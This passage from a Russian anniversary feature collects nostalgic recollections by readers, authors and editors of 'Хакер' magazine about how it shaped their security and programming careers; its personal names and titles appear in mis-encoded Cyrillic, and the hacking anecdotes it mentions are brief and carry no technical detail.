пендию. Хакер помог направить меня в нужном направле нии. Я узнал
о сущес тво вании ассемблера, программ Hiew, OllyDbg, и это помогло мне
«вылечить» некото рые прог раммы...  :) Еще пом ню, как делал bat-файлы
для авто мати зации, ну и подшучивал над друзьями. Это когда я узнал
о существовании реестра и о том, что можно бло кировать кнопку «Пуск», дис-
петчер задач и другие элементы. И тут мне в голову пришла шуточная прог-
рамма, которая бло кирует «Пуск» и откры вает окна с шуточным текстом и дви-
гающейся кноп кой «Зак рыть». На тот момент я только начинал изучать ассем-
блер, но где-то через год у меня что-то такое получилось. Правда, потом
из-за нехватки вре мени изучение ассемблера и отладчи ков забросил, о чем
сей час сильно жалею.





Ðîìàí

«Хакер» мне помог не спиться и не снар команить ся в начале нулевых. Я очень
сильно увлекся компьютерами, ког да учился в старших классах. Наверное,
самый угарный факт, что журнал я брал в обычной школьной (лицейской) биб-
лиотеке на формуляр, и даже диски к журналу можно было взять — прод-
винутое заведение. Интернета у меня тогда не было, программки и ключи
на AVP брал с дисков, пытался прог раммировать по рубрике «Кодинг» и даже
хакнул  лицен зию  WinRAR  по  одной  из  статей. В  то  время  журнал
еще назывался «Журнал компьютер ных хулиганов», это потом добавили «от».
Ну а самая крутая рубрика была «Хумор» со статьями Величайшего Гуманиста
всех вре мен и народов Даниила Шапова лова. Это просто шедевры. Игры
серии «Ядерный титбит» — это просто апогей киберкуль туры нулевых. Всем ]
[!

FiReMaN

Увидел вто рой номер в «Союзпечати», дальше всё как в тумане. Журнал очень
сильно повлиял на мой неокрепший подростковый мозг. Появ ление жур нала
ста ло просто культур ным взрывом уровня начала вещания MTV, и несколько
лет я разговаривал в основном фра зами из жур нала. Конечно, это не могло
не пов лиять на выбор специальности в вузе и последу ющей «околокомпь-
ютерной» работы, которой я фактичес ки занима юсь по сей день.
Интересных исто рий, связанных с журналом, есть несколько. К при меру,
в одном из номеров Даня в своей рубрике «Хумор» объ явил конкурс на стиш-
ки про маленького хакера. Конечно же, я, как пре данный читатель, с удоволь-
ствием поучас тво вал. И каково же было мое удивление, когда, открыв номер
#02/00, я обнаружил в нем свои произведения! В то время для меня это был
прос то супер повод для гордости и источник респекта моих друзей-гиков.
Этот бережно сохраненный номер сей час лежит передо мной вместе с двумя
перфокартами, на которых я накидал те самые стишки.





Àëåêñåé

Мне нужна была информация по особен ностям журналирования в конкрет-
ном экзем пля ре Linux. Нужная статья нашлась, и с тех пор я постоянный
читатель.

Êñåíèÿ

Интересо валась информатикой в конце девянос тых. Увидела в продаже
«Хакер» и начала приобретать печатные вер сии. В нем было много полезной
и интересной информации. У меня есть почти вся печатная версия «Хакера».
Когда жур налы впервые уви дели друзья, то испугались, подумали, что я
взлом щик. Пришлось объяснить, что хакер — это многоз нающий человек,
а журналы пришлось спрятать подальше от непонимающих глаз.

Àëåêñåé

Благода ря «Хакеру» я научился кодить. Читал Даню Шаповалова из журнала
девуш ке вслух, и она меня бро сила...





Ðîìàí

Родите ли друга держали книжный магазин. Иногда помогал им на складе,
и мне поз волялось брать что-нибудь почитать. Обычно это была фантастика,
но тут я наткнулся на это издание и зачитался до поздней ночи, но поч ти
ничего не понял. В итоге я их выкупил, перечи тывал и пытал ся все больше
понять. Потом я уже покупал себе все выпуски и, узна вая по ним что-то новое,
перечитывал предыдущие статьи и понимал все больше. Издания с дис ками
для дальних реги онов нашей Родины тоже офигенно полез ны были! Видео
по хакингу тоже было топ. На этом всем я прокачался в знании nix-like-систем.
До сих пор храню все бумажные изда ния и CD/DVD, которые уже и вста-
вить-то дома некуда!

Åâãåíèé


Трудно пере оце нить вклад журнала «Хакер» в формирование того, что сейчас
называют «оте чественная ИБ». Пожалуй, ни одного из зна чимых людей нашей
сфе ры не обо шел тот странный эффект, который удалось соз дать журналу.
  Еще с начала двухтысячных это было что-то особенное. Были «Ксакеп» (мы
так между собой называ ли, было модно) и все осталь ные. Популярность жур-
нала просто зашкаливала, и отрадно, что и 25 лет спустя, — «Хакер» все
еще один из важнейших столпов СМИ в нашей отрасли.
  Сейчас все привык ли получать контент, новости, «смеш ное» из интернета,
агре гаторов или мессен джеров, а рань ше все ждали новый выпуск, менялись
дисками, обсуждали технические статьи, в которых еще не всё понимали,
и хихикали над очень специфичным и необычным юмором Дани Шеповалова.
Всё крутилось вок руг журнала. Такое не повторить, это и есть «эффект жур-
нала “Хакер”». Сей час я понимаю, что это во мно гом и определило мой выбор
про фессии. Спасибо, «Хакер»!

Ïðîäîëæåíèå ñëåäóåò
Ес ли тоже хочешь оставить отзыв, при содиняй ся! Также мы готовим ся опуб-
ликовать вос поминания авто ров и редакторов «Хакера».
COVERSTORY





В честь того, что «Хакеру» в этом году исполняется 25 лет,
мы публикуем серию ста тей с воспоминаниями о журнале
и рас сказами о том, какую роль он сыграл в нашей жиз ни
и карьере. В прошлый раз мы дали сло во нашим любимым
читате лям, а теперь настал черед авто ров «Хакера» немного
понос таль гировать.





                        MichelleVermishelle
                                Ïåíòåñòåð â ÌÒÑ

Мне  давно  хотелось  тво рить,  что-то  создавать,  вносить  свой  вклад
в ИБ-комьюнити. «Хакер» — это имен но та площадка, которую читают все ува-
жающие себя специалис ты. Имен но «Хакер» поз волил найти новое комьюни-
ти, открыть для себя интерес ных авторов, научиться трю кам и крутым тех-
никам, которые не раз выруча ли на слож ных про ектах. Очень необычно при-
ходить на раз ные ИБ-тусовки, знакомить ся с новыми людьми, а они тебя уже
зна ют: «А, это ты тот чувак из „Хакера“?»





                           solkogan
                           Ïðîãðàììèñò, ôðèëàíñåð

Бумажные номера «Хакера» мотивировали меня в детс тве. Пом ню, как писал
локеры экрана, которые выводили на все школьные компьютеры фото нашего
класса, а потом меня вызывали к дирек тору, чтобы я их удалил. Я очень инте-
ресо вался темой компь ютерных вирусов и благодаря это му освоил прог-
рамми рование. В ито ге это определи ло мою дальнейшую профессию.





                      Âèêòîð Ïàïåðíî
                              Backend-ðàçðàáîò÷èê

Когда-то я учился в 11-м классе и написал первую статью на Хабр про iOS
и Python. Она прошла через редакторов, я очень гордился, что ее опуб-
ликова ли, и тут мне в ЛС пишет Женя Зоб нин с предложением написать
статью. Я пом ню, как я дрожащей рукой набирал первое письмо. А потом
вышла статья, еще в бумаж ной версии журнала, и я ездил за ним и за гонора-
ром. До сих пор жур нал лежит, и я пери одичес ки им хвастаюсь!





                   Þðèé Äðóãà÷
              Ìåòîäîëîã ïî ïîâûøåíèþ îñâåäîìëåííîñòè â StopPhish

Журнал «Хакер» опре делил мои интересы и мою деятельность — то, чем я
занимаюсь пос ледние пят надцать лет. Когда я жил в Воркуте, у меня еще не
было интернета и я прочитал свой первый «Хакер», мне показалось, что
«обход системы» — это очень интересная область. Пос ле этого я не пропус-
тил ни одно го выпуска журнала. Я до сих пор не «технарь», и, если бы Крис
Кас перски продол жал писать статьи, я бы все так же ничего не понимал,
но было бы все так же интерес но!
  Зато гумани тар ная часть хакерс тва меня всегда захватывала: социальная
инже нерия, фишинг и вот это вот все. В итоге в 2017 году мы с друзьями
откры ли свою ком панию и твердо вста ли на свет лую сторону в этой бесконеч-
ной игре — хакер про тив безопасника. Пока что более интересной деятель-
ности для себя я не вижу. Так что точно можно сказать, что «Хакер» помог мне
в жизни: теперь я занимаюсь любимым делом. Кста ти, когда я опубликовал
в «Хакере» свою первую статью, меня тут же взломали. Все мои пароли
в веб-сервисах были циф ровыми, и через пару часов кто-то угнал мою учетку
при помощи слитой базы паролей. Выйдя на «зло умышленника», я понял, что
меня взломал сотрудник топовой пен тестерской компании в РФ. Спасибо
тебе, Илья, приш лось разобрать ся, что такое слож ный пароль и 2FA!





                           Hackcat
                  Èíæåíåð òåñòèðîâàíèÿ áåçîïàñíîñòè â EPAM

Мне не пришлось проходить ни одного серь езно го собесе дования, когда
работодатель узна вал, что я пишу в «Хакер». А в универ ситете это осво боди-
ло меня от сдачи некото рых предметов, сдать которые у меня вообще
не было шансов. Первую работу я получил тоже исключительно благодаря
«Хакеру»: работодатель, оказывается, активно читал жур нал и, когда узнал,
что я туда пишу, сказал, что я при нят.





                     Âàëåðèé Ëèíüêîâ
                Ãåíåðàëüíûé äèðåêòîð ÎÎÎ «Íåïðàâèëüíàÿ øêîëà»

«Хакер» был со мной на про тяжении всего моего IT-пути. Увлекаться хакерс-
твом я начал еще школь ником, и зна комс тво пошло с двух журналов: «ПК
прос то», в котором были базовые знания о ПК, и «Хакера», уровень которого
мне тог да казался недосягаемым. Как-то раз я общался с другом, и мы
задумались, что хотели бы быть игро выми жур налис тами.
  В то вре мя был популярен журнал «Игромания». Мы представляли,
как будем писать статьи про игры и получать за это деньги (тог да не было
стримов). Как-то раз я услышал мысль «Не делай из хобби работу», и идея
стать игровым жур налис том у меня отпала. Я стал сетевиком и программис-
том. Со вре менем стал делиться мыслями и дошел до журнала «Хакер».
Теперь я смог сказать, что моя работа превратилась в хоб би, которое при-
носит и деньги, и удоволь ствие. В этом мне помог «Хакер» в целом и Андрей
Письменный в час тности. Мы вмес те превратили мой набор мыс лей в клас-
сную статью. Это был незабываемый опыт!





                              Soxoj
                           Ãëàâà OSINT CoE, Social Links

Ре дакторы так поспешили опуб ликовать мою первую статью, что запостили
ее с моим именем из почты, про игнориро вав про филь на сай те, где был ука-
зан никнейм. Статья разлетелась по всем темати чес ким телеграм-каналам,
так что, когда в статье имя исправили на ник, было уже поздно — «Хакер»
меня сдеано нил!





                              s0i37
             Âåäóùèé ñïåöèàëèñò ïî àíàëèçó çàùèùåííîñòè â ÓÖÑÁ

«Хакер» поч ти всю сознательную жизнь был со мной... Компьютер у меня
появился доволь но рано — в 1999 году. Я тогда был еще малень кий и вос-
при нимал его исклю читель но как игрушку. А вот мои родители заинтересо-
вались компьюте ром куда серьезнее меня, начали изучать его, покупать раз-
личную литературу.
  С тех самых пор жур нал «Хакер» начал появ ляться в нашем доме регуляр-
но. Шли годы, и я постепенно тоже начал интересо ваться этим необычным
журналом, со смелыми, креативными, а порой и хулигански ми обложками
и про вокационными темами. Пришло время поступать в вуз, и выбор пал
на ИТ-сферу, тогда еще не такую популяр ную. Затем я пошел работать обыч-
ным админом и программистом. Словом, ничего интересного.
  Но отпечаток, оставлен ный «Хакером» в детс тве, давал о себе знать.
Тянуло изучать все вокруг и делать вещи, которые коллеги тогда называли
странными, а я бы сей час назвал хулиганством. И вот пришел момент менять
работу. И тут журнал «Хакер» повлиял на мою судь бу реша ющим образом,
под толкнув сделать выбор между вакан сией Python-программиста и пен-
тестера в поль зу последнего.
  Сейчас для меня журнал «Хакер» — это вот такая коллекция.





27 килограммов чис тых зна ний! Даже спустя годы на его уже постаревших
страницах можно обнаружить уникальные, порою забытые вещи.





                     Íèêèòà Êîëìîãîðîâ
                        CTO â Big Whale Labs Inc.

В шерстис тые нулевые «Хакер» привил мне тягу ко все му связанному с компь-
ютерами! Я читал и читал бесконечные статьи, не понимая и полови ны слов.
Когда был школьником, напротив моей 23-й школы в Ниж невартов ске был
магазин «Радуга» с киоском со всякой печатью и компьютерными играми. Я
мог часами пос ле уроков (особен но когда на ули це было под минус 30)
читать описания и рассматривать скриншоты и опи сания виде оигр на дисках.
Однако каж дый раз уходил я с новым номером «Хакера» и вместо мультиков
пос ле школы читал статьи.





                      Àëåêñåé Ñîììåð
                        Lead Software Engineer â Capgemini

Как-то лет двадцать назад я написал свой первый материал и отправил его
в разные издательства. Получил предложение от одного из них, но в итоге
в публикации мне отка зали. Банально не смог выжать боль ше 40 стра ниц
из темы HTML/CSS. Как сей час помню, я был плохим мальчиком и предлагал
не следовать стандартам, а использовать то, что под держивается все ми бра-
узерами. Тогда я разместил свою статью на каком-то сай те с названием,
похожим на «Хакер», но вряд ли это был Xakep.ru.





                                 icoz

Еще в двухтысяч ных я изучал мир ассем блера, кряков и прочих хакерских тех-
ник именно по матери алам «Хакера». Пробовал что-то из ста тей сам. Статьи
рас ширяли кругозор: давали знания по устройству не толь ко компа, но и
сетей, БД и про чего... Некоторыми знаниями пользуюсь до сих пор! В конце
нулевых была шикар ная руб рика с головоломками от Скля рова. Я даже как-то
раз занял при зовое место. Но приз так и не получил. Свя зывался нес коль ко
раз по электрон ной почте, записы вали адрес и говорили, что вот-вот офор-
мят под писку (по обыч ной почте!) и пришлют какой-то пре зент. Но за полгода
так ничего и не случилось. Было так обидно, что бро сил покупать журнал (да
и контент стал не слиш ком интеллек туаль ным) и не читал его нес колько лет.
  А потом, лет десять спус тя, снова наткнулся на «Хакер», но уже новый —
только в электронном виде, на сайте, с новыми материала ми, содержащими
что-то свежее, а не пять раз переписан ное все ми из одного угла интерне та
в другой. Подписался снова! Регулярно читаю статьи и нахожу что-то новое
для себя — под держи ваю себя в форме. Спасибо, так держать!





                     Ìàðê Êëèíòîâ
    Ñïåöèàëèñò ïî îáíàðóæåíèþ êîìïüþòåðíûõ óãðîç è èíöèäåíòîâ â ÎÎÎ «ÑÈÃÌÀ»

«Хакер» стал основой для моего карь ерного рос та. Без него мои знания
и успехи оставались бы в тени. Я помню свою первую статью, которая очень
долго ждала редактуры. Это был рас сказ о моем первом качественном про-
екте на GitHub, и инфой об этом творении я хотел поделить ся с другими.
Навыков в написании ста тей у меня тог да было не так много, и при ходи лось
подстраивать ся под нормы, принятые в «Хакере». Долгое и мучительное ожи-
дание вместе с кропот ливой работой над стать ей превратились в яркое
ликова ние, когда я уви дел свое творчес тво в этом легендарном журнале. Я
счастлив, что мне удалось оста вить свой след здесь, а главное — хочу ска-
зать спасибо терпеливым и опытным редакторам!





                              DrieVlad
                  Ñïåöèàëèñò ïî àíàëèçó çàùèùåííîñòè â ÓÖÑÁ

О журнале «Хакер» я знаю не так уж давно, пример но с 2020 года. В это вре-
мя я как раз учился в уни вере и задумы вался о будущей про фессии. Я писал
курсовую по близкой к пентесту теме, и на «Хакере» оказал ся очень год ный
материал об этом. Тогда я даже подумать не мог, что через какое-то время
мой матери ал там тоже опуб ликуют. Но прошло вре мя, я начал работать, поз-
накомился с @s0i37. Он расска зал мне, что любой человек может предложить
свой матери ал для пуб ликации. Я решился и написал. Одна из интерес ных
исто рий свя зана с моей поездкой в Казахстан на конференцию. Там я поз-
накомился с местны ми ребята ми и на удивление узнал, что «Хакер» в Казах-
ста не заб локирован. Но при этом они умудряются находить материалы
и читать их. Они сказали мне, что учи лись делать NTLM Relay по моим стать-
ям, — меня очень сильно это вооду шевило, так я понял, что все это было
не бесполезно.





                     Âèòàëèé Åâñèêîâ
                         Ñîîñíîâàòåëü Inseca, IT-ýêñïåðò

Статьи в «Хакере» были моим первым опытом пуб ликации. Вдохновив шись
положи тельными отзывами, я год назад написал свой курс по теме Threat
Intelligence.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ





                  Âëàäèìèð Òèìîôååâ
                     Âëàäåëåö IT-êîìïàíèè android-tools.ru

Когда-то очень давно я прочитал в «Хакере» статью о заработке на мобиль-
ных приложениях. Много лет откладывал эту идею и сейчас жалею только
о том, что сразу не бросился в омут раз работки. При куп мне тогда ска зали,
но я не захотел переезжать в Сочи. Сейчас у меня своя ком пания, которая
занимается именно этим, но на заре рынка можно было очень быс тро соб-
рать все сливки. Тогда заработки были в разы боль ше, чем сейчас. Трудно
най ти другой источник такой же полезной информа ции, как жур нал «Хакер».





                       Èãîðü Àíòîíîâ
                           Òèìëèä â «Òèíüêîôô»

С жур нала «Хакер» начался мой путь в IT. Пер вый номер (еще бумажный) взял
почитать у при ятеля в 2000 году. Тог да я мало что понял из прочитанного,
но мне понравилась атмосфера. Мно го непонятного и интерес ного, имена
людей скрыты за никами, свой сленг, прикольные иллюстрации. Все это про-
изводило какое-то нереальное впе чат ление. С тех пор я стал пос тоянным
читате лем и мечтал ког да-нибудь стать и авто ром (и получить тот самый ящик
@real.xakep.ru). «Хакер» меня заразил иде ей постоянно в чем-то разбирать ся,
про качи вать новые навыки и искать ответы.
   Программи ровать я тоже начал благодаря журналу «Хакер». В июльском
номере за 2001 год вышла первая вводная статья по Delphi. Для меня она
ста ла точкой старта. Следом пошли кни ги и экспе рименты. Свои первые
деньги на программировании получилось зарабо тать еще в школе. В общем,
«Хакер» помог най ти хоб би, которое перерос ло в профес сию. А в 2006 году
и мои статьи стали частью журнала. Я тог да учился на втором кур се, и мне
безумно хотелось устроиться на работу разработ чиком. Хотелось соз давать
ком мерческий софт и качать навыки. Тогда найти работу именно прог-
раммистом в моем городе было сложно. Компании охотно брали студентов
тех нических вузов, а вот с гуманитариями ник то связываться не хотел. Откуда
у гумани тария нуж ные навыки? Меня отфутболили в нескольких компаниях.
Не помог и диплом с призовым мес том кра евой олимпиады по программи-
рованию (эта история тоже связана с журналом).
   Тог да я решил, что нужно под крепить свои зна ния более серьезными аргу-
ментами. Пазл сошелся, ког да вышли мои первые статьи в «Хакере». На одно
из собеседований я пришел пря мо с номером, где были мои публикации.
Это вызвало неболь шой «вау-эффект», и меня в ито ге допустили до техничес-
кой секции собесе дования, которую я прошел. Вот так я получил первую
работу программистом, а журнал стал для меня воз можностью поделиться
сво ими находками и опы том. С тех пор я регулярно пуб ликовался и в
«Хакере», и в журнале «IT Спец». Чудес ное было вре мя!





                          cyberopus
                                   Ïåíòåñòåð

«Хакер» помог мне стать пентестером и най ти любимую работу.





                      Èâàí Ïèñêóíîâ
               Ëèä êîìàíäû DevSecOps â «Ì.Âèäåî-Ýëüäîðàäî»

«Хакер» — это легенда! «Хакер» — это часть моей жизни! В конце двухтысяч-
ных, когда мое обучение на спеца ИБ в уни верситете под ходило к концу,
на вопрос «А вы будете нам расска зывать, как взламывать Linux?» я услы шал
от пре пода фразу «Я — нет! Я обучаю вас администрировать Linux. А как его
взламывать, читайте-ка сами в журнале „Хакер“!». А в 2016 году я переехал
в Москву, искал работу в ИБ и обратился в редак цию жур нала с предложени-
ем о коллаборации.
   Тог да я был скромный парень, который рвал ся наверх и хотел заявить
о себе. У меня уже был опыт написания академических статей, два образова-
ния (ИБ и бухучет) и несколько лет преподавания на кур сах ИТ. И так сло-
жилось, что у меня за плечами уже была практика реверса. Я пред ложил цикл
ста тей по реверсу малвари, и с это го началось мое вос хождение. Поз же
«Хакер» помог мне в продвижении личного брен да, мой Telegram-канал
W2hack начал наполнять ся новыми подписчиками, при ходившими с Xakep.ru.
Еще позже я выпус тил новый цикл по циф ровой форен зике.
  Я и сам многое узнавал именно со стра ниц «Хакера». Сегод ня «Хакер» —
это авто ритетнейшее изда ние не только в РФ, но и в СНГ, крупней ший и глав-
ный про фильный журнал по теме кибербеза в рус скоязычном сегменте сети.
Сегод ня я держу «Хакер» в избранных закладках и горжусь тем, что много лет
был активным авто ром! Искренне бла года рю всю команду «Хакера» за то, что
когда-то повери ли в меня, дали этот шанс и поз волили реали зовать себя!





                    Äìèòðèé Áóáíîâ
                              MikroTik-íèíäçÿ, DevSecOps

Журнал всег да под талкивал меня к изу чению нового и расширял горизонты.
Началось все с того, что я про читал куп ленный в склад чину с соседями
по общаге выпуск от корки до корки — и ничего не понял. Прочитал
еще раз — стало чуть лучше. На пятый раз уже что-то понял. Впрочем, тогда
у меня и компьюте ра-то не было: единс твен ный комп был у соседа по ком-
нате, а пароль он не говорил. Ког да сосед уез жал на выходные к родите лям,
был уве рен, что ком пом никто не пользует ся. Но он не знал, что в «Хакере»
были статьи о том, как сбросить пароль! Спустя годы я дорос до того, чтобы
пуб ликовать в любимом журнале свои статьи, и обнаружил, что все те авторы,
которыми я вос хищался, на самом деле обычные люди — такие же, как я. Рад,
что журнал обрел вто рую жизнь в интернете. Спасибо всем, кто приложил
к этому руку. Андрей, ты подарил всем нам вторую молодость!





                     Âÿ÷åñëàâ Ìîñêâèí

Когда мне было лет две надцать-три над цать, я поехал c родите лями на книж-
ную ярмарку. Там про давалось много дешевых кан цтоваров и других вещей,
необходимых для школы. И там я впервые увидел журнал «Хакер»: новые
выпуски и стопки старых, которые можно было купить за 50 рублей, а часто
еще дешев ле. Я накупил штук пять и читал дома запо ем. Одна из первых ста-
тей, которые я про читал, была про взлом сайта ЕГЭ. Было непонят но,
но очень инте ресно. Имен но так у меня зародилась идея стать хакером.
И спустя много лет я все-таки им стал, за что бла годарен журналу.





                         Dok2d

Благода ря «Хакеру» я узнал про существование DEFCON, а после даже стал
орга низатором DEFCON-группы. Как-то по стать ям из «Хакера» я сде лал
квест, который пыталась решить вся редакция того же «Хакера» с Ильей
Русане ном во гла ве. И было очень иронич но, что не смог ли пройти!





                         W0lFreaK
                        Íåçàâèñèìûé èññëåäîâàòåëü

Большое количество практичес ки ценных статей «Хакера» помогало в разных
про ектах.





                        AFANX
                    Ðåâåðñ-èíæåíåð ëàáîðàòîðèè AP Security

Когда мне было тринадцать лет, мой дядя дал мне почитать тех нические жур-
налы: Linux Format и «Хакер». Вот так я познакомил ся с ним! Мне нра вит ся его
читать, потому что статьи хорошие и информа тивные, я стараюсь писать
такие же. Для меня на первом месте делить ся своими находками и знаниями
с людьми. Именно в «Хакере» я впер вые познакомил ся с работами Кри са
Кас перски.





                             Caster
          Íåçàâèñèìûé èññëåäîâàòåëü, ñïåöèàëèñò ïî áåçîïàñíîñòè ñåòåé

Впервые я узнал о «Хакере» благодаря статье s0i37 «F#ck da Antivirus». Жур-
нал стал для меня хорошей возможностью про демонстрировать свои иссле-
дования и статьи по безопасности сетей. У меня очень много теплых вос-
поминаний, связан ных с редакцией жур нала. Я хотел бы выразить свою бла-
годарность Андрею Письменному, с которым я уже два года работаю
над статьями. Андрей всег да поддержи вал мои необычные идеи и помогал
реали зовать их в рамках формата журнала, большое ему спасибо за это, что
всег да шел навстре чу. «Хакер» — часть моей истории как автора статей, пусть
не все они получались удачными, но в каж дую из них я вложил час тичку себя.





                           FearZzZz
            Ñïåöèàëèñò ïî AppSec, ó÷àñòíèê Bug Bounty, ýòè÷íûé õàêåð

В девянос тых годах «Хакер» стал аль тер нативой всему тому, что было и в
поп-медиапрос транстве, и в молодеж ной среде. Я стал одним из тех юных
читате лей, кому жур нал в те времена показал альтер нативу, позволил сде лать
став ку на самораз витие и нелинейное изу чение новых технологий. Иссле-
дования, хакинг, хулиганство и контркультур ность — тогда эти вещи будора-
жили многих и вмес те с тем формирова ли особый тип IT-энтузиастов, эта кую
субкультуру.





                                eakj

«Хакер» — это как хороший знакомый, который всег да рад тебя видеть и даже
пос ле многих лет дисконнекта не будет спра шивать: «Дорогой, а где ты был?»
COVERSTORY





«Хакеру» в этом году исполня ется 25 лет, и мы продолжаем
публиковать вос помина ния о журнале. Нас тал черед и самой
редакции немного поностальгировать и попытаться вспом-
нить, при каких обсто ятель ствах каждый из нас пришел
в «Хакер».





                   Àíäðåé Ïèñüìåííûé
                              Ãëàâíûé ðåäàêòîð

Дав коллегам задание написать пару слов о том, как они попали в «Хакер»
и как им удалось продержаться здесь до сих пор, я еще не понимал, какую
рою для себя яму: при дется ведь и самому в очеред ной раз что-то мучитель-
но вспоминать. Что ж, деваться теперь некуда!
  Во обще, читая отзывы читателей и авто ров, я заметил, что все они начина-
ются поч ти одинако во: был беспечным юнцом, шел по улице мимо ларь ка
с журналами, вдруг уви дел необычную обложку с над писью «Хакер», купил,
про читал, ничего не понял, но жизнь в этот момент изме нилась навсегда.
  Моя история слегка отличает ся: не только тем, что свой первый «Хакер» я
нашел в полик линике, но и тем, что информационная безопасность не ста ла
сра зу же моим увле чением. Узнавать прин ципы взлома было интересно,
но куда больше увле кали новые технологии, IT-бизнес и прочие вещи,
о которых в «Хакере» толком не писали.





         Пер вый номер «Хакера», который я держал в руке руках

Долгое вре мя моим выбором был журнал «Компьютерра», в редакцию
которого я и срулил работать, не доучившись в тех ническом вузе на спе-
циальности «информатиза ция журналистики». Информатизировать журналис-
тику нуж но было незамед лительно, не дожидаясь диплома! Невозможно было
слу шать про алгол и базы данных на FoxPro, ког да за сте нами института кипит
жизнь: выходит пер вая версия Firefox, открывается YouTube, «Википедия» при-
рас тает тысячами статей в сутки.
  Первое время я работал в «Компьюлен те» — онлай новом новос тном изда-
нии, которое в середи не нулевых было на самом-самом острие технологи-
ческих новостей. Это было как раз то, что нуж но: как будто до этого все вре мя
испытывал жажду, а тут встал под водопад.
  Параллельно та же редакция занималась сайтом самой «Компьютерры»,
где публиковались не толь ко статьи из журнала, но и свои. Я стал обозревать
веб-сервисы (это сло во было новей шим в те времена) и компьютерные игры,
а так же брал интервью и учился делать популярные технические статьи
по мотивам зарубежных научных работ.
  В конце 2009 года бумажная «Компьютерра» закрылась, а сайт остался.
Число публикуемых ста тей силь но вырос ло, и для меня как раз это и было
первым опы том переноса культового компь ютерного жур нала в онлайн. Мож-
но ска зать, что в «Хакер» я пришел уже бывалым спе циалистом по циф ровой
трансформации!
  А при шел я вот как. Уволившись из «Компьютерры», я решил стать фрилан-
сером и циф ровым кочев ником: колесить по миру, брать интервью у интерес-
ных людей и писать в разные журналы. Одним из первых я предложил свои
услуги Стёпе Ильину — тог дашнему главреду «Хакера».
   Стёпа передал меня в заботливые руки Ильи Илем битова, и я стал писать
статьи в рубрику «Сцена»: про русские клоны домашних компьютеров
из восьмидесятых, про историю ARM, про лай флоггинг, про необычные
интерфейсы, про самых странных чудаков мира IT и прочие занимательные
штуки.





            175-й номер. Знак качества — в честь моей статьи!

От типич ных тем «Компьютерры» я стал перехо дить к более тра диционным
для «Хакера». Листая Motherboard, Wired и Hacker News в поисках вдох-
новения, я наткнулся на то, что вызвало у меня неподдельный интерес: исто-
рии о хакерах, крупных взломах и цифровом андерграунде. Так появились
статьи про зак рытие Silk Road, про вымыш ленные заговоры, про Cicada 3301,
про взлом самолета и дру гие увлекательные вещи.
  А потом Илья Русанен поз вал меня в редак цию на полный день, и... было
очень-очень много работы! Я обна ружил, что хакеры иногда пишут так, что
перепи сывать их статьи принятым у нас простым и понят ным язы ком —
это настоящий челлендж. Я при нял его с готов ностью и с тех пор прикладывал
свою руку чуть ли не к полови не выходя щих в «Хакере» статей.
  И ни на секунду не пожалел о своем выборе. «Хакер» — уни кальное изда-
ние с невероятной историей. Работая здесь, я познакомил ся с множеством
прекрасных людей, занимался крутыми проектами и прочитал (и поправил!)
столько текстов об изнанке технологий, сколько физически смог.





                   Âàëåíòèí Õîëìîãîðîâ
                           Âåäóùèé ðåäàêòîð

Можно сказать, что в «Хакер» я попал случай но. В те вре мена я работал
в ком пании «Док тор Веб», писал новос ти о вре доносных программах и сос-
тавлял описания малвари для вирусной библиотеки. Мне и переадре сова ли
запрос редак тора «Хакера» Александра Лозовского: журналу тре бовался
ежемесячный обзор вирусной активнос ти с подробным описани ем ана томии
наибо лее зловредных зловредов.
  Я с удо вольстви ем взялся сочинять такие заметки — собс твенно, под-
готовка публикаций для СМИ была частью моих профес сиональных обязан-
ностей. Так и началось наше сот рудничес тво, которое постепенно перешло
в плоскость неформального общения. Спустя несколько лет Александр
по секрету сообщил мне, что собира ется покинуть «Хакер», и предложил
занять его место. Я согласился не раз думывая.
  Потом состоялось собеседова ние с осно вате лем журнала Димой Ага-
руно вым и главредом Андреем Пись менным, и мы довольно быстро нашли
общий язык: на их сто роне была увлекательная работа и интересные задачи,
на моей — редактор ский опыт в журнале «Магия ПК» и «Компьютерной
газете», а также мно гочисленные публикации об IT-тех нологиях в изда ниях
раз ной сте пени красноглазос ти.
  С моей точки зре ния, «Хакер» — это не просто «компьютерный журнал»,
это культовое место силы для всех, кто интересуется информа ционной
безопасностью или тру дится в этой сфе ре. Здесь очень сильный коллектив,
как редактор ский, так и авторский. Не устаю поражаться профес сиональному
опыту и объ ему знаний экспертов, которые пишут нам материалы, а так же
тому, насколь ко слаженно и ответс твен но работает редакция, чтобы прев-
ратить эти тексты в крутые и увлекательные статьи!





Ну а что мне нравит ся в «Хакере» больше всего — так это коллектив. Яркий
и дружный, даже несмотря на то, что мы крайне ред ко видимся в офлай не
за исклю чени ем каких-то профильных мероп риятий (которые с нас тупле нием
ковид ной эпо хи так и вов се сошли на нет). Кто-то живет в Мос кве, кто-то —
в Питере, кто-то и вовсе курсиру ет между Шри-Ланкой и Казахста ном...
Но общение, пусть и виртуальное, оста ется для нас источником хорошего
нас троения.
  Искренне верю, что 25-летие — далеко не последний юбилей, который я
встре чаю с любимым журналом. Пускай сотый и двухсотый номера «Хакера» я
про пустил, все же надеюсь, что номер 400, 500 и далее по спис ку мы обя-
зательно под готовим вместе!





                   Ìàðèÿ Íåôёäîâà
                               Ðåäàêòîð íîâîñòåé

В этом году «Хакеру» исполняется 25 лет, а лич но я пишу для жур нала
уже 18 лет. Да, самой не верится, но моя первая статья в руб рике «Сцена»
вышла в далеком 2006 году. Я даже отыскала на антресолях тот самый 85-й
номер (у меня сохранился бумажный экзем пляр), подержала его в руках
и попыталась осоз нать этот огромный срок. Честно — не получи лось.
   У нас с «Хакером» все началось случайно: меня букваль но «понаб рали
по объявлению». На дво ре стояла середина нулевых. Тогда никакого Twitter
(простите, X), Telegram и кучи соцсеточек еще не было и в помине, а компания
СУП еще не купила ЖЖ, поэто му там зависа ла полови на рунета.
  Именно в ЖЖ мне на глаза попался пост Оле га «Mindw0rk» Чебене ева,
который искал авто ров для некоего «крутого тех нологичес кого журнала»,
даже не раскры вая при этом его названия.
  Опыт работы с тек стами у меня уже был, интерес к компам и ИТ — тоже,
и я решила попробовать, откликнулась на объ явление. Пом нится, я очень
вол новалась (ведь это уважаемое тех ническое изда ние!), поэтому получи ла
задание, уточ нила детали и… через нес колько дней просто сдала текст. Лишь
пос ле это го пришло осознание, что из-за волнения я не узнала ничего ни о
сро ках пуб ликации, ни об оплате. Совсем ничего. Ста ло смешно и немного
обидно, пришлось мысленно поз дравить себя с тем, что, похоже, я бес платно
написала статью непонятно для кого, непонятно куда, без каких-либо гаран-
тий.
  Но через пару месяцев меня приг ласили в офис «Хакера», тогда находив-
